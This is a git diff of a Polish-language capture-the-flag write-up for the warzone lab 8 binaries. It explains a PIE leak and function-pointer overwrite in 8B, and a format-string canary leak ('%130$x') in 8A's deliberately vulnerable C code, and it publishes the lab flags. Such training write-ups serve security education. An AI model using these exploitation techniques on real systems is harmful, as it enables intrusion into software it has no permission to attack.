@@ -18,7 +18,7 @@ Flaga:  `1m_all_ab0ut_d4t_b33f`
 
 Flaga:  `0verfl0wz_0n_th3_h3ap_4int_s0_bad`
 
-* Binarka statycznie skompilowana z Partial RELRO, kanarkiem i NX - **brak ASLR!**
+* Binarka statycznie skompilowana z Partial RELRO, kanarkiem i NX - **brak PIE!**
 * Po 60 sekundach następuje timeout, więc w debuggerze trzeba obsłużyć SIGALARM
 * Wiadomości przechowuje struktura zdefiniowana poniżej:
 ```c
@@ -109,7 +109,7 @@ lab8C@warzone:/levels/lab08$ ./lab8C -fd=3 -fn=/home/lab8B/.pass
 
 **Lab 8B**
 
-Flaga:  
+Flaga: `Th@t_w@5_my_f@v0r1t3_ch@11` 
 
 * Binarka skompilowana ze wszystkimi mechanizmami bezpieczeństwa
 * Funkcjonalność to dodawanie do siebie wektorów trzymanych w strukturze:
@@ -155,5 +155,92 @@ but was it really your favorite?\n");
 	}
 }
 ```
-* Aby pokonać PIE wystarczy dodać pierwszy wektor i wypisać go na konsolę - jest tam podany adres funkcji printFunc a następnie policzyć offset pomiędzy `printVector` a `thisIsSecret`
+* Aby pokonać PIE wystarczy dodać pierwszy wektor i wypisać go na konsolę - jest tam podany adres funkcji printFunc a następnie policzyć offset pomiędzy `printVector` a `thisIsSecret` i różnicę tych wartości zapisać w wektorze
+* Pięciokrotne dodanie wektora będącego sumą do ulubionych pozwala na całkowitą kontrolę nad wskaźnikiem funkcji w strukturze
+* Uruchomienie kodu z nowego wskaźnika następuje po załadowaniu ostatniego ulubionego wektora jako v1 i żądaniu jego wyświetlenia:
+```
+lab8B@warzone:/levels/lab08$ python /tmp/lab_8b.py
+[+] Starting program '/levels/lab08/lab8B': Done
+[*] Stage #1 - Adding first vector
+[*] Stage #2 - Leaking printVector() address
+[*] Leaked printVector() address: 0x800010e9
+[*] thisIsSecret() address: 0x800010a7
+[*] Stage #3 - Adding second vector
+[*] Stage #4 - Summing the vectors
+[*] Stage #5 - Overwrite printFunc() address
+[*] Stage #6 - Load malicious vector into v1
+[*] Stage #7 - Execution of thisIsSecret()
+[*] Switching to interactive mode
+[...]
+$ cat /home/lab8A/.pass
+Th@t_w@5_my_f@v0r1t3_ch@11
+```
+----
 
+**Lab 8A**
+
+Flaga: `flag` 
+
+* Program posiada wszystkie mechanizmy bezpieczeństwa z **wyjątkiem PIE**
+* Jego funkcjonalnością jest wypisywanie tekstów z dzieł Arystotelesa:
+	* Input "A" wypisuje `Aristote's Metaphysics 350 B.C. Book VIII`
+	* Input "F" wypisuje `Aristote's Metaphysics 350 B.C. Book IVIZ`
+	* Input `\x00` wypisuje `Aristote's Metaphysics 350 B.C. Book MN9+`
+* Program implementuje własne ciastko / kanarka na stosie w funkcji `findSomeWords()`:
+```c
+void findSomeWords() {
+    /* We specialize in words of wisdom */
+    char buf[24];
+    // to avoid the null
+    global_addr = (&buf+0x1);
+    // have to make sure no one is stealing the librarians cookies (they get angry)
+    global_addr_check = global_addr-0x2;
+    char lolz[4];
+
+    printf("\n..I like to read ^_^ <==  ");
+    read(STDIN, buf, 2048); // >> read a lot every day !
+
+    if(((*( global_addr))^(*(global_addr_check))) != ((*( global_addr))^(0xdeadbeef))){
+        printf("\n\nWoah There\n");
+        // why are you trying to break my program q-q
+        exit(EXIT_FAILURE);
+    }
+
+    // protected by my CUSTOM cookie - so soooo safe now
+    return;
+}
+```
+* Customowy kanarek pobiera adres zwykłego kanarka i 8 bajtów przed nim. Dodatkowo wszystko jest poddawane operacji xor `((kanarek ^ kanarek - 8 b) xor 0xdeadbeef)`
+* Dzięki wywołaniu `scanf()` w funkcji pobierającej nazwisko autora książki można zapisać dowolną ilość danych na stosie przepełniając bufor `buf_secure` - dodatkowym "ficzerem", który przyda się w późniejszej exploitacji (wyciek kanarka na stosie) jest format string vulnerability w `printf()`:
+```c
+void selectABook() {
+    /* Our Apologies,the interface is currently under developement */
+    char buf_secure[512];
+    scanf("%s", buf_secure);
+    printf(buf_secure);
+    if(strcmp(buf_secure, "A") == 0){
+        readA();
+    }else if(strcmp(buf_secure,"F") == 0){
+        readB();
+    }else if(*buf_secure == '\x00'){
+        readC();
+    }else if(buf_secure == 1337){
+        printf("\nhackers dont have time to read.\n");
+        exit(EXIT_FAILURE);
+    }else{
+        printf("\nWhat were you thinking, that isn't a good book.");
+        selectABook();
+    }
+    return;
+}
+```
+* Aby ominąć kanarka wymagane jest poznanie jego wartości - kanarek znajduje się na stosie pod adresem `0x5b0` a string weściowy pod `0x3b0`. Offset `(0x5b0 - 0x3b0)` pomiędzy nimi to `0x200 (512)` czyli modyfikatorem wypisującym string będzie `(512 b / 4 b ) + 2 = 130`, a dokładnie `%130$x`:
+```
+**********************************************
+{|}  Welcome to QUEND's Beta-Book-Browser  {|}
+**********************************************
+
+	==> reading is for everyone <==
+	[+] Enter Your Favorite Author's Last Name: %130$x
+f5eb2f00
+```
